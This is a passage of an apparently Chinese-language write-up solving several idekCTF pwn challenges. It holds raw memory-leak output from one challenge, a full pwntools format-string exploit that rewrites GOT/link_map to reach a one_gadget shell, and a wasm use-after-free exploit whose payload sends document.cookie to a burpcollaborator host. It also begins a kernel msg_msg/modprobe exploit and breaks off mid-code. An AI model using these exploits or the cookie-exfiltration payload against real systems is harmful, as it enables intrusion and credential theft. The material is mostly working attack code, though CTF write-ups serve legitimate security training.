+Data&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
+Data&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Data&gt; Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaData&gt; 
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
+Data&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">5</span>
+Size&gt; <span class="hljs-number">4096</span>
+<span class="hljs-string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">5</span>
+Size&gt; <span class="hljs-number">4096</span>
+<span class="hljs-string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">5</span>
+Size&gt; <span class="hljs-number">4096</span>
+<span class="hljs-string">b&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x08\xfcz\xce\x94U\x00\x00@0\xb0\x171\x7f\x00\x00\xd3to\x171\x7f\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00.\x84\xa2\xdaT8{\x00\x00\x00\x00aaaa`\xff\xff\xff\xff\xff\xff\xff\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x08\xfcz\xce\x94U\x00\x00@0\xb0\x171\x7f\x00\x00\xd3to\x171\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xed\xdfm\x171\x7f\x00\x00@gV\x171\x7f\x00\x00\x00\x86\x86\x171\x7f\x00\x00@\xd2\xd4\xcf\x94U\x00\x00\xa7\rm\x171\x7f\x00\x00@\x03\x7f\xf5\xfe\x7f\x00\x00`\x00\x7f\xf5\xfe\x7f\x00\x000\xd2\xd4\xcf\x94U\x00\x00;fz\xce\x94U\x00\x00aaaaaaaa@\xd2\xd4\xcf\x94U\x00\x00idek{exploiting_coroutines}\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00.\x84\xa2\xdaT8{ \xd4\xd4\xcf\x94U\x00\x00p\xff~\xf5\xfe\x7f\x00\x00P\xff~\xf5\xfe\x7f\x00\x00\x1a\x9cz\xce\x94U\x00\x00\x00\xd5\xd4\xcf\x94U\x00\x00\x8c\xff~\xf5\xfe\x7f\x00\x00p\xff~\xf5\xfe\x7f\x00\x00F\xa2z\xce\x94U\x00\x00\x00\xd5\xd4\xcf\x94U\x00\x00\x8c\xff~\xf5\xfe\x7f\x00\x00\x90\xff~\xf5\xfe\x7f\x00\x00X\x03\x7f\xf5\xfe\x7f\x00\x00\xa8\xff~\xf5\xfe\x7f\x00\x00\xb0\xff~\xf5\xfe\x7f\x00\x00\xc0\xff~\xf5\xfe\x7f\x00\x00\xf0\xff~\xf5\xfe\x7f\x00\x00\xc0\xff~\xf5\xfe\x7f\x00\x00\xb8\xd4\xd4\xcf\x94U\x00\x00\xc0\xff~\xf5\xfe\x7f\x00\x00$\x8ez\xce\x94U\x00\x00\x00\xd5\xd4\xcf\x94U\x00\x00\xb0\xd4\xd4\xcf\x94U\x00\x00\x00\x00\x7f\xf5\xfe\x7f\x00\x00n\x8dz\xce\x94U\x00\x00&#x27;</span>
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">5</span>
+Size&gt; <span class="hljs-number">4096</span>
+<span class="hljs-string">b&#x27;\x00\xd5\xd4\xcf\x94U\x00\x00\x98\xd4\xd4\xcf\x94U\x00\x00\x00&#x27;</span>
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; </code></pre><h3 id="relativity"><a class="header-link" href="#relativity"></a>Relativity:</h3>
+<p>程序有一个明显的格式化字符串漏洞，但是最后程序执行了_Exit，几乎和系统调用exit相同了。所以，首先想办法能够多次利用。在解析free符号时，会根据link_map-&gt;l_addr最后写回函数地址。link_map在栈上，通过修改l_addr = l_addr + 0x30， 使得free的地址被填入exit@got，这样栈发生了偏移，栈上保存的main函数地址会成为free的返回地址，这样我们就可以不断利用格式化字符串。之后的利用就是简单的格式化字符串漏洞利用了。</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+leak = <span class="hljs-keyword">lambda</span> name,addr: log.success(<span class="hljs-string">&#x27;{0}\t---&gt;\t{1}&#x27;</span>.<span class="hljs-built_in">format</span>(name, <span class="hljs-built_in">hex</span>(addr)))
+
+binary = <span class="hljs-string">&#x27;./vuln&#x27;</span>
+libc = <span class="hljs-string">&quot;./libc-2.31.so&quot;</span>
+context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]
+<span class="hljs-comment"># context.binary = binary</span>
+context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
+<span class="hljs-comment"># p = process(binary)</span>
+p = remote(<span class="hljs-string">&#x27;relativity.chal.idek.team&#x27;</span>, <span class="hljs-number">1337</span>)
+elf = ELF(binary, checksec=<span class="hljs-literal">False</span>)
+libc = ELF(libc, checksec=<span class="hljs-literal">False</span>)
+
+<span class="hljs-comment"># link_map-&gt;l_addr += 0x38, write free at exit@got</span>
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%30$hhn||%11$p||%15$p||%13$p&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0x38</span>))
+p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)
+libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">243</span>
+leak(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)
+
+p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)
+text_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x000134A</span>
+leak(<span class="hljs-string">&quot;text_base&quot;</span>, text_base)
+
+p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)
+stack = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)
+leak(<span class="hljs-string">&quot;stack&quot;</span>, stack)
+
+free_got = text_base + <span class="hljs-number">0x4018</span>
+main = text_base + <span class="hljs-number">0x000134A</span>
+one = libc_base + <span class="hljs-number">0xe3b01</span>
+
+<span class="hljs-comment"># a pointer in stack to free@got</span>
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%34$hn&quot;</span>.<span class="hljs-built_in">format</span>((stack&amp;<span class="hljs-number">0xffff</span>)-<span class="hljs-number">0x8</span>*<span class="hljs-number">4</span>))
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%53$hn&quot;</span>.<span class="hljs-built_in">format</span>((free_got&amp;<span class="hljs-number">0xffff</span>)))
+
+<span class="hljs-comment"># free@got == main</span>
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%55$hn&quot;</span>.<span class="hljs-built_in">format</span>((main&amp;<span class="hljs-number">0xffff</span>)))
+
+<span class="hljs-comment"># exit@got == one_gadget</span>
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%65$hhn&quot;</span>.<span class="hljs-built_in">format</span>(((free_got+<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>)))
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%67$hn&quot;</span>.<span class="hljs-built_in">format</span>(((one)&amp;<span class="hljs-number">0xffff</span>)))
+<span class="hljs-comment"># recover link_map</span>
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%66$hhn%{}c%77$hhn&quot;</span>.<span class="hljs-built_in">format</span>((free_got+<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>+<span class="hljs-number">2</span>)&amp;<span class="hljs-number">0xffff</span>))
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%79$hn&quot;</span>.<span class="hljs-built_in">format</span>(((one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>)))
+
+<span class="hljs-comment"># recover free@got, pwn!</span>
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%89$hhn&quot;</span>.<span class="hljs-built_in">format</span>(((free_got)&amp;<span class="hljs-number">0xff</span>)))
+p.sendlineafter(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;%{}c%91$hn&quot;</span>.<span class="hljs-built_in">format</span>(((text_base+<span class="hljs-number">0x1030</span>)&amp;<span class="hljs-number">0xffff</span>)))
+
+<span class="hljs-string">&#x27;&#x27;&#x27;
+0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+  &#x27;&#x27;&#x27;</span>
+
+p.interactive()</code></pre><h3 id="weep"><a class="header-link" href="#weep"></a>Weep:</h3>
+<p>看main.c的C语言，delete函数中很明显的UAF问题</p>
+<p>主要逆向了wasm中的以下函数：</p>
+<ul class="list">
+<li>wasm的memory是一个巨大的ArrayBuffer，以下用m代指</li>
+<li>add函数：<ul class="list">
+<li><code>m[66144 + (idx &lt;&lt; 3) + 4] = strlen(m[8+var4])</code></li>
+<li><code>m[66144 + (idx &lt;&lt; 3)] = strdup(m[8+var4])</code></li>
+</ul>
+</li>
+<li><code>setTitle</code>函数：<code>m[66112] = 1/2/3</code>，分别对应着<code>title_fp</code>指针指向<code>mrTitle</code>/<code>mrsTitle</code>/<code>emscripten_run_script</code>三个函数</li>
+<li><code>greet</code>函数中，判断的<code>numCalls</code>位于<code>m[66128]</code></li>
+<li>用到的gc是<code>dlmalloc</code>和<code>dlfree</code>，应该是<code>ptmalloc</code>的起源。总之，debug wasm来观察堆块的分配模式，之后尝试了下类似于fastbin模式的利用，发现是可以的<ul class="list">
+<li>分配到<code>m[66112]</code> ，修改为3，即指向<code>emscripten_run_script</code>函数</li>
+<li>分配到<code>m[66128]</code>，将<code>numCalls</code>改成负数（0xfffffff8）</li>
+</ul>
+</li>
+<li><code>emscripten_run_script</code>在index.js加入了长度小于23的限制，所以拼接指令最后拿flag</li>
+</ul>
+<p>exp</p>
+<pre class="hljs"><code><span class="hljs-keyword">let</span> code = <span class="hljs-string">&#x27;fetch(&quot;http://xxx.burpcollaborator.net&quot;,{method:&quot;POST&quot;,mode:&quot;no-cors&quot;,body:document.cookie})&#x27;</span>;
+
+<span class="hljs-built_in">console</span>.log(btoa(<span class="hljs-built_in">JSON</span>.stringify([
+    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaa&quot;</span>],
+    [<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],
+    [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],
+    [<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;8\x02\x01&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-string">&quot;\x03&quot;</span>],
+    [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],
+    [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>],
+    [<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;H\x02\x01&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-string">&quot;aaaa&quot;</span>],
+    [<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-string">&quot;\xf8\xff\xff\xff&quot;</span>],
+    [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&quot;window.a=&#x27;&#x27;&quot;</span>],
+    [<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],
+    ...[...code].reduce(<span class="hljs-function">(<span class="hljs-params">total, char</span>) =&gt;</span> (
+        total = [...total, [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-string">`a+=&#x27;<span class="hljs-subst">${char}</span>&#x27;`</span>],[<span class="hljs-number">3</span>,<span class="hljs-number">5</span>]]
+    ), []),
+    [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&quot;eval(a)&quot;</span>],
+    [<span class="hljs-number">3</span>,<span class="hljs-number">5</span>],
+])));</code></pre><h3 id="sofiregood"><a class="header-link" href="#sofiregood"></a>Sofire=good:</h3>
+<p>题目本身与区块链没有关系。是一个内核菜单堆题。虽然开启了kaslr，但是我们可以读取kallsyms的内容，从而泄露内核地址。</p>
+<p>程序有四种功能：</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_RMALL  0x1337</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_ADD    0xdeadbeef</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_GET    0xcafebabe</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_EDIT   0xbabecafe</span></code></pre><p>所有的结点使用带有头节点的单链表维护，并且头节点是全局变量。</p>
+<pre class="hljs"><code><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_head</span>{</span>
+    <span class="hljs-keyword">char</span> coin_art[<span class="hljs-number">0x70</span>];
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_entry</span>* <span class="hljs-title">head</span>;</span>
+    <span class="hljs-keyword">int</span> total_nft;
+} sofirium_head;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_entry</span>{</span>
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sofirium_entry</span>* <span class="hljs-title">next</span>;</span>
+    <span class="hljs-keyword">char</span> nft[CHUNK_SIZE];
+} sofirium_entry;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">request</span>{</span>
+    <span class="hljs-keyword">int</span> idx;
+    <span class="hljs-keyword">char</span> buffer[CHUNK_SIZE];
+} request;
+
+sofirium_head * head;</code></pre><p>漏洞点：</p>
+<ul class="list">
+<li>在rmall中会将所有的结点都free， 包括头节点，但是没有置空造成了UAF。</li>
+<li>在edit和get中，使用req-&gt;idx作为索引的上限，即我们的idx可以大于total_nft实现越界访问。
+要实现任意地址读写就要控制结构的next指针，在msg_msg结构中正好有这个指针供我们利用。我们发送的所有消息都会被链入list_head。我们能控制的大小为0x100，如果两个小message相邻，就可以控制next指针实现任意地址读写。</li>
+</ul>
+<p>利用思路：</p>
+<ul class="list">
+<li>泄露内核地址</li>
+<li>申请一定数量的结点，并将它们全部释放</li>
+<li>使用msg_msg结构复用其中一个结点的空间</li>
+<li>申请多个小的msg_msg，使两个结构在堆中相邻</li>
+<li>修改next指针到目标位置，修改modprobe为/tmp/x</li>
+</ul>
+<p>exp:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;./exploit.h&quot;</span> <span class="hljs-comment">// some header files</span></span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_RMALL 0x1337</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_ADD 0xdeadbeef</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_GET 0xcafebabe</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NFT_EDIT 0xbabecafe</span>
+
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x100</span>
+
+<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> {</span>
